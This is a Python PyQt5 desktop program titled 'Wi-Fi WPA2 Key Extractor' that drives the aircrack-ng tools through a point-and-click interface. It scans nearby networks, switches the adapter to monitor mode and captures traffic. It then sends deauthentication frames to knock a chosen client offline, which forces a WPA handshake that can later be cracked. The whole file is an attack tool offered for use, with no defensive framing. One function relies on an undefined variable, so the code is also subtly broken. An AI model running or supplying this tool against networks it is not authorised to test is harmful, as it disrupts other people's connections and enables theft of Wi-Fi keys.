import subprocess
import threading
import time
from PyQt5 import QtWidgets, QtGui, QtCore

# Function to update progress bar with animation
def animate_progress(label, text, progress, max_value=100, speed=2):
    label.setText(text)
    for i in range(0, max_value + 1, speed):
        progress.setValue(i)
        QtWidgets.QApplication.processEvents()
        time.sleep(0.05)  # Smooth animation delay

# Function to scan Wi-Fi networks
def scan_networks():
    animate_progress(progress_label, "Scanning for Wi-Fi...", progress_bar)
    networks_list.clear()
    
    output = subprocess.run(["nmcli", "-t", "-f", "SSID,BSSID,CHAN", "device", "wifi"], capture_output=True, text=True).stdout
    time.sleep(1)

    lines = output.strip().split("\n")
    for line in lines:
        parts = line.split(":")
        if len(parts) >= 3:
            ssid = parts[0] if parts[0] else "Hidden SSID"
            bssid = parts[1]
            channel = parts[2]
            networks_list.addItem(f"{ssid} | BSSID: {bssid} | CH: {channel}")
    
    progress_label.setText("Scan Complete ✅")
    progress_bar.setValue(100)

# Function to perform attack
def attack_sequence(bssid, channel):
    animate_progress(progress_label, "Killing Interfering Processes...", progress_bar)
    subprocess.run(["sudo", "airmon-ng", "check", "kill"])
    
    animate_progress(progress_label, "Starting Monitor Mode...", progress_bar)
    subprocess.run(["sudo", "airmon-ng", "start", "wlan0"])
    time.sleep(1)

    animate_progress(progress_label, "Capturing Handshake...", progress_bar, max_value=70)
    subprocess.Popen(["sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", "capture", "wlan0"])
    time.sleep(5)

    animate_progress(progress_label, "Finding Connected Devices...", progress_bar, max_value=85)
    output = subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "-c", channel, "wlan0"], capture_output=True, text=True).stdout
    
    clients_list.clear()
    for line in output.split("\n"):
        if bssid in line and ":" in line:
            client_mac = line.split()[0]
            clients_list.addItem(f"Client: {client_mac}")
    
    progress_label.setText("Select a device to deauth ⏳")
    progress_bar.setValue(90)

# Function to deauthenticate selected client
def deauth_client():
    selected_item = clients_list.currentItem()
    if not selected_item:
        return
    
    client_mac = selected_item.text().split(": ")[1]
    animate_progress(progress_label, f"Deauthenticating {client_mac}...", progress_bar, max_value=90)
    subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, "-c", client_mac, "wlan0"])
    
    time.sleep(5)
    animate_progress(progress_label, "Checking for Handshake...", progress_bar, max_value=95)
    handshake_check = subprocess.run(["sudo", "aircrack-ng", "capture-01.cap"], capture_output=True, text=True).stdout
    
    if "WPA handshake" in handshake_check:
        progress_label.setText("Handshake Captured! ✅")
    else:
        progress_label.setText("Failed to Capture Handshake ❌")
    
    progress_bar.setValue(100)

# Function to start attack in background thread
def start_attack():
    selected_item = networks_list.currentItem()
    if not selected_item:
        return
    
    values = selected_item.text().split(" | ")
    ssid, bssid, channel = values[0], values[1].split(": ")[1], values[2].split(": ")[1]
    threading.Thread(target=attack_sequence, args=(bssid, channel), daemon=True).start()

# Function to restore Wi-Fi
def restore_wifi():
    animate_progress(progress_label, "Restoring Wi-Fi...", progress_bar)
    subprocess.run(["sudo", "airmon-ng", "stop", "wlan0"])
    subprocess.run(["sudo", "service", "NetworkManager", "restart"])
    progress_label.setText("Wi-Fi Restored ✅")
    progress_bar.setValue(100)

# GUI Application
app = QtWidgets.QApplication([])
window = QtWidgets.QWidget()
window.setWindowTitle("Wi-Fi WPA2 Key Extractor")
window.resize(650, 500)
layout = QtWidgets.QVBoxLayout()

# Title
title_label = QtWidgets.QLabel("WPA2 Key Extractor")
title_label.setFont(QtGui.QFont("Arial", 22, QtGui.QFont.Bold))
layout.addWidget(title_label)

# Network List
networks_list = QtWidgets.QListWidget()
layout.addWidget(networks_list)

# Clients List
clients_list = QtWidgets.QListWidget()
layout.addWidget(clients_list)

# Progress Bar
progress_label = QtWidgets.QLabel("Idle...")
layout.addWidget(progress_label)
progress_bar = QtWidgets.QProgressBar()
progress_bar.setValue(0)
layout.addWidget(progress_bar)

# Buttons
button_layout = QtWidgets.QHBoxLayout()
scan_btn = QtWidgets.QPushButton("🔍 Scan Networks")
scan_btn.clicked.connect(scan_networks)
button_layout.addWidget(scan_btn)

attack_btn = QtWidgets.QPushButton("💥 Start Attack")
attack_btn.clicked.connect(start_attack)
button_layout.addWidget(attack_btn)

restore_btn = QtWidgets.QPushButton("🔄 Restore Wi-Fi")
restore_btn.clicked.connect(restore_wifi)
button_layout.addWidget(restore_btn)

deauth_btn = QtWidgets.QPushButton("🚨 Deauth Selected Device")
deauth_btn.clicked.connect(deauth_client)
button_layout.addWidget(deauth_btn)

layout.addLayout(button_layout)
window.setLayout(layout)
window.show()
app.exec_()
